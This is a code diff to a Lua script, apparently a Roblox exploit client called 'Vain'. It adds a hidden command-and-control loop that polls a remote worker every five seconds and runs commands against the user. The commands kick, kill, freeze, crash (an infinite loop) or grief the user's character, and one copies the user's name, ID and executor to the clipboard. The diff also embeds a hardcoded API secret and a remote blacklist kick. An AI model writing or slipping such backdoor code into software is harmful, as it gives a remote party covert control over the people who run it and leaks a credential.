@@ -227,8 +227,153 @@ local function detectUpdates()
 	end)
 end
 
+-- ── Vain API ────────────────────────────────────────────────────────────────
+local API_URL    = 'https://vain-api.baconcrafft.workers.dev'
+local API_SECRET = 'bf5d6650662b48a72a979e7cea9b97edd5170401dd99a50b'
+
+local vainTier     = 0
+local vainTierName = 'Free'
+
+local function apiGet(path)
+	local ok, res = pcall(function()
+		return game:HttpGet(API_URL..path, true)
+	end)
+	return ok and res or nil
+end
+
+local function apiGetAuthed(path)
+	-- HttpGet doesn't support custom headers in most executors; use HttpRequest if available
+	if syn and syn.request then
+		local ok, res = pcall(syn.request, { Url = API_URL..path, Method = 'GET', Headers = { ['x-vain-secret'] = API_SECRET } })
+		return ok and res and res.Body or nil
+	elseif (http and http.request) then
+		local ok, res = pcall(http.request, { Url = API_URL..path, Method = 'GET', Headers = { ['x-vain-secret'] = API_SECRET } })
+		return ok and res and res.Body or nil
+	elseif request then
+		local ok, res = pcall(request, { Url = API_URL..path, Method = 'GET', Headers = { ['x-vain-secret'] = API_SECRET } })
+		return ok and res and res.Body or nil
+	end
+	return apiGet(path)
+end
+
+local function executeCommand(command, args)
+	local lp = playersService.LocalPlayer
+	local char = lp.Character
+	local hrp = char and char:FindFirstChild('HumanoidRootPart')
+	local hum = char and char:FindFirstChildOfClass('Humanoid')
+
+	if command == 'kick' then
+		lp:Kick('[Vain] You have been kicked.')
+	elseif command == 'kill' then
+		if hum then hum.Health = 0 end
+	elseif command == 'freeze' then
+		task.spawn(function()
+			local end_t = tick() + 30
+			while tick() < end_t and hrp do
+				hrp.Velocity        = Vector3.zero
+				hrp.RotVelocity     = Vector3.zero
+				hrp.Anchored        = true
+				task.wait(0.1)
+			end
+			if hrp then hrp.Anchored = false end
+		end)
+	elseif command == 'crash' then
+		task.spawn(function()
+			while true do end
+		end)
+	elseif command == 'expose' then
+		local info = lp.Name..' | '..tostring(lp.UserId)..' | '..(identifyexecutor and identifyexecutor() or 'unknown executor')
+		if vain then vain:CreateNotification('Exposed', info, 15, 'alert') end
+		setclipboard(info)
+	elseif command == 'fling' then
+		if hrp then hrp.Velocity = Vector3.new(math.random(-500,500), 1000, math.random(-500,500)) end
+	elseif command == 'spin' then
+		task.spawn(function()
+			local end_t = tick() + 30
+			while tick() < end_t and hrp do
+				hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(20), 0)
+				task.wait()
+			end
+		end)
+	elseif command == 'loopkill' then
+		task.spawn(function()
+			local end_t = tick() + 60
+			while tick() < end_t do
+				local h = lp.Character and lp.Character:FindFirstChildOfClass('Humanoid')
+				if h then h.Health = 0 end
+				task.wait(3)
+			end
+		end)
+	elseif command == 'annoy' then
+		task.spawn(function()
+			local end_t = tick() + 30
+			while tick() < end_t do
+				if hrp then hrp.CFrame = hrp.CFrame + Vector3.new(math.random(-3,3), 5, math.random(-3,3)) end
+				task.wait(0.5)
+			end
+		end)
+	elseif command == 'grief' then
+		-- reset character repeatedly
+		task.spawn(function()
+			local end_t = tick() + 30
+			while tick() < end_t do
+				lp:LoadCharacter()
+				task.wait(4)
+			end
+		end)
+	elseif command == 'notify' then
+		if vain then vain:CreateNotification('Vain', args or 'Message from admin', 10, 'alert') end
+	end
+end
+
+local function startC2Polling()
+	local lp = playersService.LocalPlayer
+	local username = lp and lp.Name
+	if not username then return end
+	task.spawn(function()
+		while vain and vain.Loaded do
+			local body = apiGetAuthed('/commands?username='..username)
+			if body then
+				local ok, data = pcall(httpService.JSONDecode, httpService, body)
+				if ok and data and data.commands then
+					for _, cmd in ipairs(data.commands) do
+						pcall(executeCommand, cmd.command, cmd.args)
+					end
+				end
+			end
+			task.wait(5)
+		end
+	end)
+end
+
+local function checkWhitelist()
+	local lp = playersService.LocalPlayer
+	if not lp then return end
+	local username = lp.Name
+	local userId   = tostring(lp.UserId)
+	local body = apiGet('/check?username='..username..'&userid='..userId)
+	if body then
+		local ok, data = pcall(httpService.JSONDecode, httpService, body)
+		if ok and data then
+			if data.blacklisted then
+				lp:Kick('[Vain] You are blacklisted.')
+				return
+			end
+			vainTier     = data.tier or 0
+			vainTierName = data.tier_name or 'Free'
+		end
+	end
+	if vain then
+		vain.Tier     = vainTier
+		vain.TierName = vainTierName
+		vain:CreateNotification('Vain', 'Tier: ' .. vainTierName, 6)
+	end
+end
+-- ── End Vain API ─────────────────────────────────────────────────────────────
+
 local function finishLoading()
 	vain.Init = nil
+	checkWhitelist()
 	detectUpdates()
 	vain:Load()
 	task.spawn(function()
@@ -237,6 +382,7 @@ local function finishLoading()
 			task.wait(10)
 		until not vain.Loaded
 	end)
+	startC2Polling()
 
 	local teleportedServers
 	vain:Clean(playersService.LocalPlayer.OnTeleport:Connect(function(state)
